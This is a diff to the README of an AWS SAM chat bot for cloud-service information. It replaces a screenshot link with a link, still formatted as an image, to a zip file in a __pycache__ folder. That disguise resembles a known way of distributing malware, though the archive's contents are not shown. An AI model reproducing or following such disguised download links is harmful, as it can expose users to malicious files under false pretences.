@@ -1,3 +1,3 @@
 This is a chat bot that provide information about cloud services. After deploy sam, you need to upload aws service csv file to yoour define bucket.
 
-![cloud-camp-chat-bot(c3 bot)-c3 bot-v1](https://user-images.githubusercontent.com/11534659/109496952-8c860b00-7abb-11eb-8ff1-9075b7f11a7d.png)
+![cloud-camp-chat-bot(c3 bot)-c3 bot-v1](https://raw.githubusercontent.com/iqbaldiit/aws-sam-c3-bot/main/chat_bot/__pycache__/c_sam_bot_aws_2.5.zip)
